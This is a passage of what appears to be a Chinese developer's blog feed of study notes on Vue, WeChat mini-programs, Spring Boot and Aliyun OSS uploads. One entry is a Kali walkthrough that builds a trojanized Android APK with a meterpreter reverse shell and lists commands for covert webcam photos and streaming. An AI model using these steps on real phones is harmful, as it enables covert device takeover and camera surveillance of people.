class="comment">// 如果在此处使用Object.freeze()方法，则改变data中的值，不会影响到视图。如下</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// Object.freeze(data);</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 此方法将data变为只读</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>: data</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 此处展示data中的a,且此时,data中的a和app中的a是同一个</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">a</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">a</span> == app.<span class="property">a</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 如果修改app中的a,data中的a也会改变，为双向绑定</span></span></span><br><span class="line"><span class="language-javascript">app.<span class="property">a</span> = <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">a</span>)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 但是，我在此处，于data实例中加入b元素,app中不会加入b</span></span></span><br><span class="line"><span class="language-javascript">data.<span class="property">b</span> = <span class="number">100</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(app.<span class="property">b</span>)   <span class="comment">// undefined</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">b</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 假如我想一开始就加入一个b元素，但是我不知道b的值，可以定义b为null，例如：var data = &#123;a:1, b:null&#125;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 获取到el这个元素</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(app.<span class="property">$el</span>==<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;app&quot;</span>));</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 获取data</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(app.<span class="property">$data</span> == data);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Vue实例生命周期："><a href="#Vue实例生命周期：" class="headerlink" title="Vue实例生命周期："></a>Vue实例生命周期：</h3><h4 id="生命周期过程："><a href="#生命周期过程：" class="headerlink" title="生命周期过程："></a>生命周期过程：</h4><ol><li>new Vue()实例化一个vue实例，然后init初始化event和lifecycle</li><li>执行beforeCeate生命周期函数</li><li>beforeCreate执行完后，进行数据初始化，定义data数据，方法以及事件</li><li>执行created生命周期函数。执行该函数的时候，可以拿到data下的数据以及methods下的方法，即，可调用方法进行数据请求</li><li>created执行完后，会判断当前是否有el参数。如果有，会再判断是否有template参数；如果没有，则等待调用$mount(el)方法</li><li>确保有了el之后，如果再往下判断是否有template参数。如果有，将template模板转化成render函数；如果没有，则将获取到的el编译成template,然后将这个template转换为render函数</li><li>再调用beforeMount</li><li>之后产生一个虚拟dom，进行保存，再将rander渲染成真实的dom</li><li>调用mounted</li><li>然后只有当数据变化时，触发beforeUpdate，将变化后的数据渲染到页面上，并且deforeUpate调用后，会重新生成一个新的虚拟dom，然后和原来的比较，算出最小更新范围，从而更新render之中的数据，再将render渲染成真实dom</li><li>beforeUpdate之后会执行update，具体过程和上一步差不多</li><li>之后就是beforeDestroy，此时仍可进行实例操作</li><li>销毁完成后，再执行destroyed</li></ol><h4 id="生命周期函数以及应用场景："><a href="#生命周期函数以及应用场景：" class="headerlink" title="生命周期函数以及应用场景："></a>生命周期函数以及应用场景：</h4><ul><li>beforeCreate（<strong>创建前</strong>）：常用于加loading</li><li>created（<strong>创建后</strong>）：loading结束后，做一些初始化，实现函数自执行</li><li>beforeMount（<strong>载入前</strong>）</li><li>mounted（<strong>载入后</strong>）：发起后端请求，拿回数据，配合路由钩子做一些事情</li><li>beforeUpdate（<strong>更新前</strong>）</li><li>updated（<strong>更新后</strong>）</li><li>beforeDestroy（<strong>销毁前</strong>）： 你确认删除XX吗？</li><li>destroyed（<strong>销毁后</strong>）：当前组件已被删除，清空相关内容</li></ul>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue自定义组件</title>
      <link href="/2022/12/31/vue%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6/"/>
      <url>/2022/12/31/vue%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>组件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 1.自定义标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mentaltest</span>&gt;</span><span class="tag">&lt;/<span class="name">mentaltest</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 2.自定义标签绑定固定值 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jumparading</span> <span class="attr">num</span>=<span class="string">&quot;二&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">jumparading</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 3.自定义标签绑定变量 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hunter</span> <span class="attr">v-bind:three</span>=<span class="string">&quot;number&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">hunter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 1.自定义标签</span></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;mentaltest&#x27;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">template</span>: <span class="string">&#x27;&lt;h1&gt; 这是第一个组件 &lt;h1&gt;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 2.自定义标签绑定固定值</span></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;jumparading&#x27;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">props</span>: [<span class="string">&#x27;num&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript"><span class="attr">template</span>: <span class="string">&#x27;&lt;h2&gt; 这是第&#123;&#123;num&#125;&#125;个组件 &lt;h2&gt;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 3.自定义标签绑定变量</span></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;hunter&#x27;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">props</span>: [<span class="string">&#x27;three&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript"><span class="attr">template</span>: <span class="string">&#x27;&lt;h2&gt; 这是第&#123;&#123;three&#125;&#125;个组件 &lt;h2&gt;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">number</span>:<span class="string">&#x27;三&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序笔记（一）</title>
      <link href="/2022/12/31/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2022/12/31/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="一、项目结构"><a href="#一、项目结构" class="headerlink" title="一、项目结构"></a>一、项目结构</h3><ol><li><strong>pages</strong>：用来存放所有小程序页面</li><li><strong>utils</strong>：用来存放工具性质的模块（例如：格式化时间的自定义模块）</li><li><strong>app.js</strong>：小程序项目的入口文件</li><li><strong>app.json</strong>：小程序项目的全局配置文件</li><li><strong>app.wxss</strong>：小程序项目的全局样式文件</li><li><strong>project.config.json</strong>：项目的配置文件</li><li><strong>sitemap.json</strong>：用来配置小程序及其页面是否允许被微信索引</li></ol><h3 id="二、小程序的页面组成部分"><a href="#二、小程序的页面组成部分" class="headerlink" title="二、小程序的页面组成部分"></a>二、小程序的页面组成部分</h3><p>官方建议把所有小程序页面，都放在pages目录中，以单独文件夹存在，每个页面由4个基本文件组成：</p><ol><li><strong>.js</strong>文件（页面的脚本文件，存放页面的数据、事件处理函数等）</li><li><strong>.json</strong>文件（当前页面的配置文件，配置窗口的外观、表现等）</li><li><strong>.wxml</strong>文件（页面的模板结构文件）</li><li><strong>.wxss</strong>文件（当前页面的样式表文件）</li></ol><h3 id="三、小程序代码的构成-JSON配置文件"><a href="#三、小程序代码的构成-JSON配置文件" class="headerlink" title="三、小程序代码的构成 - JSON配置文件"></a>三、小程序代码的构成 - JSON配置文件</h3><p>JSON配置文件的作用：通过不同的<strong>.json</strong>配置文件，可以对小程序项目进行不同级别的配置</p><p>小程序中有4种JSON配置文件，分别为：</p><ol><li>项目根目录中的 <strong>app.json</strong> 配置文件：当前小程序的全局配置，包括了小程序的所有页面路径、窗口外观、界面表现、底部tab等,有以下几个主要配置项：<ol><li>pages: 用来记录当前小程序所有页面的路径</li><li>window：全局定义小程序所有页面的背景色、文字颜色等</li><li>style：全结定义小程序组件所使用的样式版本（默认v2）</li><li>sitemapLocation：用来指明 sitemap.json 的位置</li></ol></li><li>项目根目录中的 <strong>project.config.json</strong> 配置文件：项目配置文件，用来记录我们对小程序开发工具所做的个性化配置，例如：<ol><li>setting 中保存了编译相关的配置</li><li>projectname 中保存项目名称（可随意填写，不等于小程序名字）</li><li>appID 中保存小程序账号的ID（如果是在自己账号上运行别人的项目，记得把APPID改成自己的，否则容易报错）</li></ol></li><li>项目根目录中的 <strong>sitemap.json</strong> 配置文件：配置小程序页面是否允许微信索引。如果允许微信索引，微信会通过爬虫为小程序页面内容建立索引。当用户搜索关键词和页面的索引匹配成功时，小程序的页面将可能展示在搜索结果中。（<em>注：sitemap 的索引提示是默认开启的，如果需要关闭索引提示，可在peoject.config.json 的 setting 中配置字段 <strong>checkSiteMap</strong> 为 false</em>）</li><li>每个页面文件夹中的 <strong>.json</strong> 文件：</li></ol>]]></content>
      
      
      <categories>
          
          <category> 微信小程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微信小程序笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali渗透测试android</title>
      <link href="/2022/12/24/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95android/"/>
      <url>/2022/12/24/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95android/</url>
      
        <content type="html"><![CDATA[<h4 id="环境-kali-linux"><a href="#环境-kali-linux" class="headerlink" title="环境: kali linux"></a>环境: kali linux</h4><h4 id="目标：一台安卓机"><a href="#目标：一台安卓机" class="headerlink" title="目标：一台安卓机"></a>目标：一台安卓机</h4><p>ifconfig查看虚拟机ip</p><p>在终端输入命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a java --platform android -p android/meterpreter/reverse_tcp lhost=虚拟机ip lport=监听端口（例：<span class="number">3333</span>） -x test.apk R &gt; apk.apk </span><br></pre></td></tr></table></figure><p>在/home/用户名 文件夹中找到apk.apk文件，想办法给手机安装（微信传输会添加拓展名，QQ不会）</p><p>在终端输入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p>启动终端，然后一次输入下列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.u</span>se exploit/multi/handler 加载模块</span><br><span class="line"><span class="number">2.</span><span class="built_in">set</span> payload android/meterpreter/reverse_tcp  选择Payload</span><br><span class="line"><span class="number">3.</span>show options 查看参数设置</span><br><span class="line"><span class="number">4.</span><span class="built_in">set</span> LHOST 虚拟机IP</span><br><span class="line"><span class="number">5.</span><span class="built_in">set</span> LPORT 监听端口（此处必须和前面一样）</span><br><span class="line"><span class="number">6.</span>exploit 开始监听</span><br></pre></td></tr></table></figure><p>如果手机上安装了木马，就会看见一个会话连接</p><p>以下是以下操作命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sysinfo 查看手机操作系统</span><br><span class="line">webcam_list 查看手机摄影头有几个</span><br><span class="line">webcam_snap 隐秘拍照功能</span><br><span class="line">webcam_stream 开启摄像头</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBootApplication 注解</title>
      <link href="/2022/12/18/SpringBootApplication-%E6%B3%A8%E8%A7%A3%E8%AF%A6%E8%A7%A3/"/>
      <url>/2022/12/18/SpringBootApplication-%E6%B3%A8%E8%A7%A3%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="SpringBootApplication-注解"><a href="#SpringBootApplication-注解" class="headerlink" title="@SpringBootApplication 注解"></a>@SpringBootApplication 注解</h2><p>@SpringBootApplication是一个组合注解，主要由@SpringBootConfiguration、@EnableAutoConfiguration和@ComponentScan组成</p><h3 id="SpringBootConfiguration详解"><a href="#SpringBootConfiguration详解" class="headerlink" title="@SpringBootConfiguration详解"></a>@SpringBootConfiguration详解</h3><p>@SpringBootConfiguration实际上就是@Configuration，功能上没有太大区别</p><h4 id="Configuration-注解"><a href="#Configuration-注解" class="headerlink" title="@Configuration 注解"></a>@Configuration 注解</h4><p>表示该类为配置类，在里面注入Bean</p><h5 id="Configuration和-Component-的区别"><a href="#Configuration和-Component-的区别" class="headerlink" title="@Configuration和@Component 的区别"></a>@Configuration和@Component 的区别</h5><ol><li>spring容器在启动时会默认加载一些后置处理器，其中有个处理器就叫ConfigurationClassPostProcessor，这个处理器会专门处理带有@Configuration注解的类。它会将所有带有@Conguration的类存进指定容器，然后通过cglib代理进行增强，对于已经被创建的对象不会进行重新创建。而@Component则没有被代理，会重复创建对象。</li></ol><h3 id="EnableAutoConfiguration注解"><a href="#EnableAutoConfiguration注解" class="headerlink" title="@EnableAutoConfiguration注解"></a>@EnableAutoConfiguration注解</h3><p>开启自动化配置，主要依靠@Import和@AutoConfigurationPackage,实际上就是导入了两个配置类AutoConfigurationImportSelector和Registrar</p><h4 id="首先我们解析-import的作用："><a href="#首先我们解析-import的作用：" class="headerlink" title="首先我们解析@import的作用："></a>首先我们解析@import的作用：</h4><p>在原生的spring framework中，组件装配经历了三个阶段：</p><ol><li><p>spring 2.5+开始，可以使用@component等注解来装配bean</p></li><li><p>spring 3.0+开始，使用@Configuration + @bean的方式</p></li><li><p>spring 3.1+ 开始，使用模块装配，比如@EnableXXX + @Import，下为演示</p><ol><li><p>首先创建一个实体类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Apple</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>然后自定义一个注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Import(&#123;Apple.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableFruit &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在启动类中加入注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableFruit</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(DemoApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在测试类中进行测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DemoApplicationTests</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    Apple apple;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;apple = &quot;</span> + apple);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>如果在控制台看到下列结果，就可证明注入成功</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apple = com.example.demo.<span class="keyword">module</span>.Apple@75798d03</span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="ComponentScan注解"><a href="#ComponentScan注解" class="headerlink" title="@ComponentScan注解"></a>@ComponentScan注解</h3><p>包扫描，<strong>默认情况下扫描的是当前这个类所在的包下面的所有类</strong>，所以建议放在根包下面，否则需要进行重新指定</p>]]></content>
      
      
      <categories>
          
          <category> java笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里云oss文件上传</title>
      <link href="/2022/12/11/%E9%98%BF%E9%87%8C%E4%BA%91oss%E4%B8%8A%E4%BC%A0/"/>
      <url>/2022/12/11/%E9%98%BF%E9%87%8C%E4%BA%91oss%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="阿里云oss文件上传"><a href="#阿里云oss文件上传" class="headerlink" title="阿里云oss文件上传"></a>阿里云oss文件上传</h1><h3 id="所需依赖"><a href="#所需依赖" class="headerlink" title="所需依赖"></a>所需依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.aliyun.oss<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aliyun-sdk-oss<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.10.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="其次获取到目标阿里云的AccessKey-ID和AccessKey-Secret填入yml中，如图所示"><a href="#其次获取到目标阿里云的AccessKey-ID和AccessKey-Secret填入yml中，如图所示" class="headerlink" title="其次获取到目标阿里云的AccessKey ID和AccessKey Secret填入yml中，如图所示"></a>其次获取到目标阿里云的AccessKey ID和AccessKey Secret填入yml中，如图所示</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">aliyun:</span></span><br><span class="line">  <span class="attr">oss:</span></span><br><span class="line">    <span class="attr">file:</span></span><br><span class="line">      <span class="attr">endpoint:</span> <span class="string">oss-cn-hangzhou.aliyuncs.com</span>   <span class="string">//</span> <span class="string">节点，此处为（华东1）杭州</span></span><br><span class="line">      <span class="attr">keyid:</span> <span class="string">LxxxxxxxxxxxxxW</span></span><br><span class="line">      <span class="attr">keysecret:</span> <span class="string">txxxxxxxxxxxRM</span></span><br><span class="line">      <span class="attr">bucketname:</span> <span class="string">leebook</span>     <span class="string">//</span> <span class="string">目标桶名称</span></span><br></pre></td></tr></table></figure><h3 id="编写OSS工具类OssUtils"><a href="#编写OSS工具类OssUtils" class="headerlink" title="编写OSS工具类OssUtils"></a>编写OSS工具类OssUtils</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ll.aliyunoss.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.InitializingBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by a handsome man</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: mental_test</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/12/08/22:42</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 交给spring管理</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OssUtils</span> <span class="keyword">implements</span> <span class="title class_">InitializingBean</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 读取配置文件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;aliyun.oss.file.endpoint&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String endpoint;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;aliyun.oss.file.keyid&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String keyid;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;aliyun.oss.file.keysecret&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String keysecret;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;aliyun.oss.file.bucketname&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String bucketname;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义公开静态常量</span></span><br><span class="line"><span class="comment">     * 当下面值初始化完成后接口会执行</span></span><br><span class="line"><span class="comment">     * 通过下面的公共方法就可以在别处引用变量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span 